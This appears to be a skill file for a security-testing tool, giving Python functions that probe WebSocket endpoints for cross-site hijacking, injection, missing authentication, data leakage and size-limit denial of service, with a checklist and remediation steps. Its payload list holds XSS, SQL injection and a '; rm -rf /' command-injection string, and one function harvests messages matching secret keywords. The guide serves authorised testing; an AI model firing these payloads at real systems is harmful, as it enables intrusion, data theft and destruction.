---
name: websocket_testing
description: WebSocket security testing - hijacking, injection, cross-site WebSocket hijacking
---

# WebSocket Security Testing

Test WebSocket connections for vulnerabilities including hijacking, injection, and data leakage.

## Attack Categories

### 1. WebSocket Hijacking (CSWSH)

Cross-Site WebSocket Hijacking:

```python
import websocket
import time

def test_cswsh(ws_url: str, origin: str = "https://evil.com") -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    try:
        # Connect from malicious origin
        ws = websocket.create_connection(
            ws_url,
            origin=origin,
            timeout=10
        )
        
        # If connection succeeds without proper origin validation
        result = ws.recv()
        if result:
            results["vulnerable"] = True
            results["evidence"].append("WebSocket connected from malicious origin")
            results["evidence"].append(f"Received data: {result[:100]}")
        
        ws.close()
    except Exception as e:
        if "reject" not in str(e).lower():
            results["evidence"].append(f"Connection error: {str(e)}")
    
    return results
```

### 2. Message Injection

Inject malicious messages into WebSocket:

```python
def test_message_injection(ws_url: str) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    payloads = [
        # XSS in messages
        '{"message": "<script>alert(1)</script>"}',
        # SQL injection
        '{"message": "\' OR 1=1--"}',
        # Command injection
        '{"message": "; rm -rf /"}',
        # JSON injection
        '{"message": "\\", "admin": true}',
    ]
    
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        
        for payload in payloads:
            ws.send(payload)
            time.sleep(0.5)
            
            try:
                response = ws.recv()
                if response:
                    results["evidence"].append(f"Sent: {payload[:50]}")
                    results["evidence"].append(f"Got: {response[:100]}")
            except:
                pass
        
        ws.close()
    except Exception as e:
        results["evidence"].append(f"Connection error: {str(e)}")
    
    return results
```

### 3. Authentication Bypass

Test WebSocket without authentication:

```python
def test_ws_auth_bypass(ws_url: str) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Test 1: Connect without token
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        result = ws.recv()
        if result:
            results["vulnerable"] = True
            results["evidence"].append("Connected without authentication")
        ws.close()
    except Exception as e:
        results["evidence"].append(f"No-auth connection: {str(e)}")
    
    # Test 2: Connect with invalid token
    try:
        ws = websocket.create_connection(
            ws_url,
            header={"Authorization": "Bearer invalid_token"},
            timeout=10
        )
        result = ws.recv()
        if result:
            results["vulnerable"] = True
            results["evidence"].append("Accepted invalid token")
        ws.close()
    except Exception as e:
        results["evidence"].append(f"Invalid token: {str(e)}")
    
    return results
```

### 4. Data Leakage

Capture sensitive data from WebSocket:

```python
def test_data_leakage(ws_url: str, duration: int = 30) -> dict:
    results = {"vulnerable": False, "evidence": [], "data": []}
    
    sensitive_patterns = [
        "password", "token", "secret", "key",
        "email", "phone", "ssn", "credit",
    ]
    
    try:
        ws = websocket.create_connection(ws_url, timeout=duration)
        
        start = time.time()
        while time.time() - start < duration:
            try:
                message = ws.recv()
                if message:
                    results["data"].append(message[:200])
                    
                    # Check for sensitive data
                    for pattern in sensitive_patterns:
                        if pattern.lower() in message.lower():
                            results["vulnerable"] = True
                            results["evidence"].append(
                                f"Sensitive data found: {pattern}"
                            )
            except websocket.WebSocketTimeoutException:
                break
        
        ws.close()
    except Exception as e:
        results["evidence"].append(f"Error: {str(e)}")
    
    return results
```

### 5. Message Size Limit Testing

Test for denial of service via large messages:

```python
def test_message_size_limit(ws_url: str) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    sizes = [1024, 10240, 102400, 1048576]  # 1KB to 1MB
    
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        
        for size in sizes:
            payload = "A" * size
            try:
                ws.send(payload)
                results["evidence"].append(f"Accepted {size} byte message")
            except Exception as e:
                if "too large" in str(e).lower():
                    results["evidence"].append(f"Rejected at {size} bytes")
                break
        
        ws.close()
    except Exception as e:
        results["evidence"].append(f"Error: {str(e)}")
    
    return results
```

### 6. Protocol Downgrade

Test for protocol manipulation:

```python
def test_protocol_downgrade(ws_url: str) -> dict:
    results = {"vulnerable": False, "evidence": []}
    
    # Test with different WebSocket versions
    versions = [8, 13]  # WebSocket protocol versions
    
    for version in versions:
        try:
            ws = websocket.create_connection(
                ws_url,
                subprotocols=["graphql-ws", "graphql-transport-ws"],
                timeout=10
            )
            results["evidence"].append(f"Accepted protocol version {version}")
            ws.close()
        except Exception as e:
            results["evidence"].append(f"Version {version}: {str(e)}")
    
    return results
```

## WebSocket Vulnerability Checklist

| Vulnerability | Risk | Test |
|---------------|------|------|
| Cross-Site WebSocket Hijacking | High | Connect from malicious origin |
| Missing Authentication | High | Connect without token |
| Message Injection | Medium | Send malicious payloads |
| Data Leakage | High | Monitor for sensitive data |
| No Rate Limiting | Medium | Send rapid messages |
| No Message Size Limit | Medium | Send large messages |
| Protocol Downgrade | Low | Test different versions |

## Integration with Aegis

Add to **Category 5 - Client-Side**:
- [ ] Test WebSocket authentication
- [ ] Test origin validation
- [ ] Test message size limits
- [ ] Test for data leakage
- [ ] Test for injection vulnerabilities

## Remediation

1. Validate Origin header on connection
2. Require authentication for WebSocket connections
3. Implement message size limits
4. Rate limit WebSocket messages
5. Sanitize all received messages
6. Use WSS (secure WebSocket) in production
